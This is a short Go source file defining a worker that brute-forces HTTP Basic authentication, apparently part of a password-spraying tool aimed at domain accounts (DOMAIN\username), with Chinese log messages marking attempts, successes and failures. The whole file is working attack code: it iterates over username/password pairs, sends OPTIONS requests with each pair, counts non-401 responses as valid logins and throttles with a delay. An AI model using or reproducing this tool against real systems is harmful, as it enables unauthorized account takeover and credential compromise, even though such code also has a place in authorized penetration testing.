package lib

import (
	"net/http"
	"time"
)

func BasicBruteWorker(info *TaskInfo) {

	for data := range info.task {
		username, password := data[0], data[1]
		if info.done.Get(username) {
			continue
		}
		Log.Debug("[*] 尝试: %v:%v", username, password)
		req, _ := http.NewRequest("OPTIONS", info.u, nil)
		req.SetBasicAuth(info.domain+"\\"+username, password)
		req.Header.Add("Connection", "close")
		res, err := Client.Do(req)
		if err != nil {
			panic(err)
		}
		if res.StatusCode != 401 && res.StatusCode != 408 && res.StatusCode != 504 {
			Log.Success("[+] 成功: %v", username+":"+password)
			info.done.Set(username)
		} else {
			Log.Failed("[-] 失败: %v", username+":"+password)
		}
		time.Sleep(time.Second * time.Duration(info.delay))
	}
}
